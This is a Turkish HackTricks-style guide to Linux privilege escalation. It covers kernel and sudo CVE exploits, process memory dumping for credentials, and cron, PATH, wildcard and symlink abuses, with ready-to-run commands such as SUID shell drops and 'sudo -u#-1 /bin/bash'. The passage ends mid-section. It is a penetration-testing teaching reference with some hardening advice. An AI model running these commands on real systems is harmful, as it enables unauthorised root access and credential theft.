# Linux Yetki Yükseltme

{{#include ../../../banners/hacktricks-training.md}}

Daha kapsamlı bir arka plan ve geçmişte kullanılan keşif iş akışları için references bölümünde listelenen g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation ve linux-private-i kaynaklarını inceleyin.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Sistem Bilgileri

### İşletim sistemi bilgisi

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Yol

**PATH** değişkeni içindeki herhangi bir klasörde **yazma izinleriniz** varsa bazı kütüphaneleri veya ikili dosyaları hijack edebilirsiniz:

```bash
echo $PATH
```

### Ortam bilgisi

Ortam değişkenlerinde ilginç bilgiler, parolalar veya API anahtarları mı var?

```bash
(env || set) 2>/dev/null
```

### Kernel exploit'leri

Kernel sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit olup olmadığını araştırın.

[Kernel/LPE/CVE bölümü](../../main-system-information/kernel-lpe-cves/README.md), yerel ayrıcalık yükseltme vakalarını ve Binary Exploitation'daki ayrıntılı Linux kernel incelemelerine bağlantıları içerir. Bir vaka çalışmasını test etmeden önce etkilenen build'i ve yapılandırmayı doğrulayın.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

İyi bir savunmasız kernel listesi ve önceden **derlenmiş exploitler** bulabileceğiniz yerler: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
**Derlenmiş exploitler** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Bu web sitesinden tüm savunmasız kernel sürümlerini çıkarmak için şunu çalıştırabilirsiniz:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Kernel exploit'lerini aramaya yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim üzerinde çalıştırın; yalnızca kernel 2.x için exploit'leri kontrol eder)

Kernel sürümünü her zaman **Google'da arayın**; kernel sürümünüz bir kernel exploit'inde yazıyor olabilir. Böylece exploit'in geçerli olduğundan emin olabilirsiniz.

Ek kernel exploitation teknikleri:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux'ta Yetki Yükseltme - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo sürümü

Şurada yer alan savunmasız sudo sürümlerine dayanarak:

```bash
searchsploit sudo
```

sudo sürümünün savunmasız olup olmadığını bu grep ile kontrol edebilirsiniz.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 ile 1.9.17** arasındaki sürümlerde, sudo `/etc/nsswitch.conf` dosyasını kullanıcının denetimindeki bir dizinden yüklediğinde ayrıcalıksız yerel kullanıcılar `--chroot` seçeneği aracılığıyla root yetkilerine yükselebilir; upstream bu sorunu **1.9.17p1** sürümünde düzeltti. İlgili yollardaki root-setuid bitine sahip tüm sudo binary'lerini kontrol edin; `sudo -V` yalnızca `PATH` tarafından seçilen binary'yi bildirir. Dağıtım paketleri, upstream sürüm dizesini değiştirmeden düzeltmeyi backport edebilir; bu nedenle satıcı paketinin durumunu da doğrulayın. [sudo maintainer'ın güvenlik duyurusuna](https://www.openwall.com/lists/oss-security/2025/06/30/3) bakın.<sup>[[28]](#references)[[29]](#references)</sup>

Bu [zafiyeti](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) exploit etmek için bir [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) burada. Exploit'i çalıştırmadan önce `sudo` sürümünüzün zafiyetten etkilendiğinden ve `chroot` özelliğini desteklediğinden emin olun.  

Daha fazla bilgi için orijinal [zafiyet duyurusuna](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) bakın.<sup>[[28]](#references)</sup>

### Sudo ana bilgisayar tabanlı kuralları atlatma (CVE-2025-32462)

Upstream sudo **1.8.8 ile 1.9.17** arasındaki sürümlerde, ana bilgisayar tabanlı sudoers kuralları **gerçek ana bilgisayar adı** yerine `sudo -h <host>` komutuyla **kullanıcının sağladığı ana bilgisayar adı** kullanılarak değerlendirilebilir; upstream bu sorunu **1.9.17p1** sürümünde düzeltti. Kullanıcının seçilen ana bilgisayarda eşleşen bir sudoers girdisi yine de olmalıdır. Yerel politikanın yanı sıra satıcı backport'larını ve alternatif sudo binary'lerini de inceleyin. [sudo maintainer'ın güvenlik duyurusuna](https://www.openwall.com/lists/oss-security/2025/06/30/2) bakın.<sup>[[29]](#references)</sup>

Gereksinimler:
- Zafiyetten etkilenen sudo sürümü
- Ana bilgisayara özgü sudoers kuralları (ana bilgisayar, geçerli ana bilgisayar adı veya `ALL` olmamalıdır)

Örnek sudoers kalıbı:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

İzin verilen host'u spoof etme yoluyla exploit et:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Seçilen adın çözümlenmesi engelleniyorsa, ana makinede bu adın nasıl çözümlendiğini doğrulayın. Bir adı günlükte veya yapılandırma dosyasında görmek, o adın çözümlenebilir olduğu anlamına gelmez; ayrıca `/etc/hosts` dosyasını değiştirmek genellikle ayrıcalıklı yazma erişimi gerektirir.

#### sudo < v1.8.28

Bu [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287), root kullanıcısı hariç `ALL` kullanıcıları adına komut çalıştırmaya izin veren etkin bir sudo kuralı gerektirir; örneğin `(ALL, !root) /bin/bash`. Çağıranın, kimlik doğrulama gereksinimleri de dahil olmak üzere, bu kuralı kullanmasına izin verilmiş olmalıdır. Kurulu paketin güvenlik duyurusunu kontrol edin: üreticiler düzeltmeyi, görüntülenen upstream sürümü hâlâ 1.8.28'in altında olan sürümlere geri taşımıştır. Tek başına bir `!root` kuralı veya eski bir sürüm, sistemin bu açıktan etkilendiğini doğrulamaz. Pasif keşif sırasında ayrıcalıklı bir komutu test etmeyin.

```
sudo -u#-1 /bin/bash
```

### Dmesg imza doğrulaması başarısız oldu

Bu güvenlik açığının nasıl istismar edilebileceğine dair bir **örnek** için HTB'deki **smasher2 kutusunu** inceleyin.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Daha fazla sistem enumeration'ı

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Olası savunmaları listeleyin

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Bir container içindeyseniz, aşağıdaki container-security bölümünden başlayıp ardından runtime'a özgü abuse sayfalarına geçin:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Sürücüler

**Nelerin mount edilmiş ve unmount edilmiş olduğunu**, nerede ve neden olduğunu kontrol edin. Unmount edilmiş bir şey varsa, mount edip özel bilgileri kontrol etmeyi deneyebilirsiniz.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Yararlı yazılımlar

Yararlı ikili dosyaları listeleyin

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Ayrıca **herhangi bir derleyicinin kurulu olup olmadığını kontrol edin**. Bu, bir kernel exploit kullanmanız gerekirse işe yarar; exploit'i kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Yüklü Güvenlik Açığı Bulunan Yazılımlar

**Yüklü paketlerin ve servislerin sürümlerini** kontrol edin. Örneğin, privilege escalation için exploit edilebilecek eski bir Nagios sürümü olabilir…\
Daha şüpheli görünen yüklü yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Makineye SSH erişiminiz varsa, makinede yüklü olan güncel olmayan ve güvenlik açığı bulunan yazılımları kontrol etmek için **openVAS** da kullanabilirsiniz.

> [!NOTE] > _Bu komutların çoğu işe yaramayacak çok fazla bilgi göstereceğini unutmayın. Bu nedenle, yüklü herhangi bir yazılım sürümünün bilinen exploit'lere karşı savunmasız olup olmadığını kontrol eden OpenVAS veya benzeri uygulamaları kullanmanız önerilir._

## Süreçler

Yürütülen **süreçlere** göz atın ve herhangi bir sürecin **olması gerekenden daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (örneğin root tarafından çalıştırılan bir tomcat olabilir mi?)

```bash
ps aux
ps -ef
top -n 1
```

Her zaman çalışan [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin; bunları kötüye kullanarak ayrıcalıkları yükseltebilirsiniz. **Linpeas**, süreçlerin komut satırında `--inspect` parametresini kontrol ederek bunları tespit eder.\
Ayrıca **süreçlerin binary dosyaları üzerindeki ayrıcalıklarınızı kontrol edin**; belki birinin dosyasının üzerine yazabilirsiniz.

### Farklı kullanıcılar arasında üst-alt süreç zincirleri

Üst sürecinden **farklı bir kullanıcı** altında çalışan bir alt süreç otomatik olarak kötü amaçlı değildir, ancak yararlı bir **ön inceleme sinyalidir**. Bazı geçişler beklenen davranışlardır (`root`'un bir hizmet kullanıcısı başlatması, oturum yöneticilerinin oturum süreçleri oluşturması gibi); ancak alışılmadık zincirler wrapper'ları, debug yardımcılarını, kalıcılığı veya zayıf runtime güven sınırlarını ortaya çıkarabilir.

Hızlı inceleme:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Beklenmedik bir zincir bulursanız, üst komut satırını ve davranışını etkileyen tüm dosyaları (`config`, `EnvironmentFile`, yardımcı betikler, çalışma dizini, yazılabilir argümanlar) inceleyin. Gerçek privesc yollarının birkaçında, alt süreç yazılabilir değildi; ancak **üst süreç tarafından denetlenen config** veya yardımcı zincir yazılabilirdi.

### Silinmiş yürütülebilir dosyalar ve silinmiş dosyalar

Çalışma zamanı yapıtlarına, **silindikten sonra da** çoğu zaman erişilebilir. Bu, hem yetki yükseltme hem de hassas dosyaları hâlâ açık olan bir süreçten kanıt kurtarma açısından yararlıdır.

Silinmiş yürütülebilir dosyaları kontrol edin:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

`/proc/<PID>/exe` `(deleted)` değerini gösteriyorsa süreç hâlâ eski binary imajını bellekte çalıştırıyor demektir. Bu, araştırılması gereken güçlü bir işarettir çünkü:

- kaldırılan executable ilginç dizeler veya kimlik bilgileri içerebilir
- çalışan süreç hâlâ yararlı dosya tanımlayıcılarını açık tutuyor olabilir
- silinmiş bir ayrıcalıklı binary, yakın zamanda yapılmış bir kurcalamaya veya temizleme girişimine işaret edebilir

Silinmiş ve açık dosyaları sistem genelinde toplayın:

```bash
lsof +L1
```

İlginç bir tanımlayıcı bulursanız, onu doğrudan kurtarın:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Bu, özellikle bir süreç silinmiş bir gizli bilgiyi, betiği, veritabanı dışa aktarımını veya flag dosyasını hâlâ açık tutuyorsa çok değerlidir.

### Süreç izleme

Süreçleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçlar kullanabilirsiniz. Bu, sık sık çalıştırılan veya belirli gereksinimler karşılandığında çalıştırılan güvenlik açığı bulunan süreçleri belirlemek için çok yararlı olabilir.

#### sudo altında Linux ProcMon

[Linux için ProcMon](https://github.com/microsoft/ProcMon-for-Linux), seçilen süreçleri ve sistem çağrılarını izleyebilir ve SQLite iz kaydı kaydedebilir. `sudo -l` kısıtlamasız, root yetkisiyle çalışabilen bir `procmon` komutuna izin veriyorsa bunun başka bir kullanıcının süreç girdisini veya çıktısını gözlemleyip gözlemleyemeyeceğini değerlendirin. Bu izin yalnızca incelenmesi gereken bir ipucudur: izleyici desteği, geçerli politika ve uygun bir sürecin etkinliği de önemlidir. İz kayıtları gizli bilgiler içerebilir; bu nedenle yetkili dışa aktarımları dikkatle inceleyin ve ilgisiz süreçleri toplamaktan kaçının.

### Süreç belleği

Bazı sunucu hizmetleri **kimlik bilgilerini bellekte düz metin olarak saklar**.\
Normalde başka kullanıcılara ait süreçlerin belleğini okumak için **root yetkilerine** ihtiyacınız olur. Bu nedenle, bu yöntem genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi keşfetmek istediğinizde kullanışlıdır.\
Ancak **normal bir kullanıcı olarak sahibi olduğunuz süreçlerin belleğini okuyabileceğinizi** unutmayın.

> [!WARNING]
> Günümüzde çoğu makinenin **ptrace kullanımına varsayılan olarak izin vermediğini** unutmayın. Bu, ayrıcalıksız kullanıcınıza ait diğer süreçlerin bellek dökümünü alamayacağınız anlamına gelir.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ dosyası ptrace erişimini denetler:
>
> - **kernel.yama.ptrace_scope = 0**: Aynı uid'ye sahip oldukları sürece tüm süreçlerde hata ayıklanabilir. ptrace'in çalışma şekli geleneksel olarak böyleydi.
> - **kernel.yama.ptrace_scope = 1**: Yalnızca üst süreçte hata ayıklanabilir.
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE yeteneği gerektirdiğinden ptrace'i yalnızca yöneticiler kullanabilir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bu değer ayarlandıktan sonra ptrace'i yeniden etkinleştirmek için sistemi yeniden başlatmak gerekir.

Parola kasasının kilidini kısa süreliğine açan aynı UID'ye sahip bir süreç, ayrı bir kimlik bilgisi sınırı oluşturabilir. İzlemeye izin verildiğinde etkin ve dökümü alınabilir bir süreç, şifrelenmiş kasa dosyasının kendisi korunsa bile, girdi sistem çağrıları veya belleği aracılığıyla kasa parolasını açığa çıkarabilir. `ptrace_scope=0` tek başına yeterli değildir: kimlik bilgilerinin eşleşmesi, hedef sürecin dökümünün alınabilir olması, diğer Linux güvenlik modülleri ve sürecin çalışma süresi de önemlidir. Bir kasa girdisinin Unix root oturum açma bilgisi olarak kullanılabilmesi için ayrıca kimlik bilgilerinin yeniden kullanımını kontrol etmek gerekir. Rutin keşif işlemleri, girdiyi kaydetmek veya gizli bilgileri yazdırmak yerine politikayı ve aday süreç ya da kasa yollarını raporlamalıdır. [Çekirdeğin Yama belgelerine](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) ve [ptrace erişim kontrollerine](https://man7.org/linux/man-pages/man2/ptrace.2.html) bakın.

#### GDB

Örneğin bir FTP hizmetinin belleğine erişiminiz varsa Heap'i alıp içindeki kimlik bilgilerini arayabilirsiniz.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB Script

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir süreç kimliği için **maps, belleğin bu sürecin sanal adres alanında nasıl eşlendiğini** gösterir; ayrıca **eşlenen her bölgenin izinlerini** de gösterir. **mem** sözde dosyası **sürecin belleğinin kendisini açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve bunların ofsetlerini öğreniriz. Bu bilgileri kullanarak **mem dosyasında ilgili konumlara gider ve okunabilir tüm bölgeleri** bir dosyaya dökeriz.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem`, sistemin **fiziksel** belleğine erişim sağlar; sanal belleğine değil. Kernel'ın sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle `/dev/mem` yalnızca **root** ve **kmem** grubu tarafından okunabilir.

```
strings /dev/mem -n10 | grep -i PASS
```

### Linux için ProcDump

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış sürümüdür. [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) adresinden edinebilirsiniz.

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Araçlar

Bir process memory dump'ı almak için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root gereksinimlerini manuel olarak kaldırabilir ve size ait process'i dump edebilirsiniz
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) içindeki Script A.5 (root gerekir)

### Process Memory'den Kimlik Bilgileri

#### Manuel örnek

authenticator process'inin çalıştığını fark ederseniz:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

İşlemi dump edebilir (işlem belleğini dump etmenin farklı yollarını bulmak için önceki bölümlere bakın) ve bellekte kimlik bilgilerini arayabilirsiniz:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) aracı **bellekten** ve bazı **bilinen dosyalardan** düz metin kimlik bilgilerini **çalabilir**. Düzgün çalışması için root ayrıcalıkları gerekir.

| Özellik                                           | İşlem Adı           |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Etkin FTP Bağlantıları)                   | vsftpd               |
| Apache2 (Etkin HTTP Basic Auth Oturumları)         | apache2              |
| OpenSSH (Etkin SSH Oturumları - Sudo Kullanımı)    | sshd:                |

#### Arama Regex'leri/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Zamanlanmış/Cron işleri

### Crontab UI (alseambusher) root olarak çalışıyor – web tabanlı scheduler privesc

Bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback’e bağlıysa, SSH local port-forwarding ile yine de erişip yükseltme yapmak için ayrıcalıklı bir job oluşturabilirsiniz.<sup>[[1]](#references)[[4]](#references)</sup>

Tipik zincir
- Loopback-only portu (örn. 127.0.0.1:8000) ve Basic-Auth realm’ini `ss -ntlp` / `curl -v localhost:8000` ile keşfedin
- Kimlik bilgilerini operasyonel dosyalarda bulun:
  - `zip -P <password>` içeren yedekler/scriptler
  - `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` değerlerini açığa çıkaran systemd unit’i
- Tünel açıp giriş yapın:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir iş oluştur ve hemen çalıştır (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```

Sıkılaştırma
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcı kullanın ve izinleri asgari düzeyde tutun
- localhost'a bağlayın ve erişimi ayrıca firewall/VPN üzerinden kısıtlayın; parolaları yeniden kullanmayın
- Gizli bilgileri unit dosyalarına eklemekten kaçının; secret store veya yalnızca root'un erişebildiği EnvironmentFile kullanın
- İsteğe bağlı job çalıştırmaları için audit/logging'i etkinleştirin

Zamanlanmış job'lardan herhangi birinin güvenlik açığı içerip içermediğini kontrol edin. Belki root tarafından çalıştırılan bir script'ten yararlanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlink kullanabilir misiniz? root'un kullandığı dizinde belirli dosyalar oluşturabilir misiniz?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

`run-parts` kullanılıyorsa, hangi adların gerçekten çalıştırılacağını kontrol edin:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Bu, yanlış pozitifleri önler. Yazılabilir bir periyodik dizin, yalnızca payload dosya adınız yerel `run-parts` kurallarıyla eşleşiyorsa işe yarar.

### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH'i bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_"user" kullanıcısının /home/user üzerinde yazma izinleri olduğuna dikkat edin_)

Bu crontab içinde root kullanıcısı, yolu ayarlamadan bir komut veya script çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Ardından, şu şekilde bir root shell elde edebilirsiniz:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Wildcard içeren bir script kullanarak Cron (Wildcard Injection)

root tarafından çalıştırılan bir script bir komutun içinde “**\***” içeriyorsa, beklenmedik şeyler (privesc gibi) yapmak için bundan yararlanabilirsiniz. Örnek:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Wildcard bir path tarafından önceleniyorsa, örneğin** _**/some/path/\***_ **, savunmasız değildir (hatta** _**./\***_ **bile savunmasız değildir).**

Daha fazla wildcard exploitation trick için şu sayfayı okuyun:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Cron log ayrıştırıcılarında Bash aritmetik genişletme enjeksiyonu

Bash aritmetiği, güvenilmeyen metni ifade olarak yorumlayabilir. Etkilenen Bash bağlamlarında, bu ifadenin içindeki bir dizi alt indisi, bir komut ikamesini değerlendirebilir. Ayrıcalıklı bir cron/parser, saldırgan denetimindeki log metnini böyle bir aritmetik karşılaştırmaya yerleştirirse, ikame parser'ın kimliğiyle çalışabilir.<sup>[[22]](#references)</sup> Bu, Bash ifadesinin ve sürümünün tam biçimine bağlıdır; genişletilmiş bir değişkendeki yalın `$(...)0` dizgesi, tek başına yeniden değerlendirmeyi güvenilir biçimde göstermez.

Girdi, dosya meta verilerinden veya kullanıcı tarafından yazılabilir bir konumdan okunan başka bir alandan da gelebilir. Örneğin, bir görselin `Producer` etiketini okuyan ve bunu `[[ "$producer" -eq "expected" ]]` ile karşılaştıran ayrıcalıklı bir temizleme betiği, değişken tırnak içine alınmış olsa bile aritmetik karşılaştırma yapar. Zamanlanmış görevin hangi kimlikle çalıştığını, etiketi hangi dosyaların sağlayabileceğini, karşılaştırmadan önce yapılan dönüşümleri ve Bash'in tam olarak nasıl davrandığını izleyin. Metin etiketleri için dizge karşılaştırması kullanın; sayılar için aritmetik işlemden önce girdinin ondalık rakamlardan oluştuğunu doğrulayın. [Bash aritmetik kurallarına](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html) bakın.

- Tipik savunmasız örüntü:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Dizi indisleme mekanizması için güvenli yerel davranış yoklaması (ayrıcalıklı bir işlem veya dosya değişikliği olmadan):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Gerçekten zamanlanmış script'i ve açtığı literal giriş yolunu izleyin. Log dosyasının kendisi yazılabilir olmasa bile, sticky bit olmayan üst dizinine yazma ve dizinde gezinme izni olan bir kullanıcı dizin girdisini değiştirebilir; `namei -l` bu izinleri ayırt etmeye yardımcı olur. Farklı bir yazılabilir log yolu, okunamayan bir scheduler veya bu alanı Bash arithmetic olarak hiç değerlendirmeyen bir parser, bu yolu doğrulamaz.

### Cron script'ini üzerine yazma ve symlink

Root tarafından çalıştırılan bir cron script'ini **değiştirebiliyorsanız**, kolayca bir shell elde edebilirsiniz:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Root tarafından çalıştırılan betik, **tam erişiminiz olan bir dizini** kullanıyorsa, bu klasörü silip sizin kontrol ettiğiniz bir betiği sunan başka bir dizine **sembolik bağlantı** oluşturmak faydalı olabilir.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Symlink doğrulaması ve daha güvenli dosya işlemleri

Dosyaları path üzerinden okuyan veya yazan privileged script/binary'leri incelerken linklerin nasıl işlendiğini doğrulayın:

- `stat()` bir symlink'i izler ve hedefin meta verilerini döndürür.
- `lstat()` linkin kendisinin meta verilerini döndürür.
- `readlink -f` ve `namei -l`, son hedefi çözümlemeye ve her path bileşeninin izinlerini göstermeye yardımcı olur.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Savunmacılar/geliştiriciler için symlink hilelerine karşı daha güvenli kalıplar şunlardır:

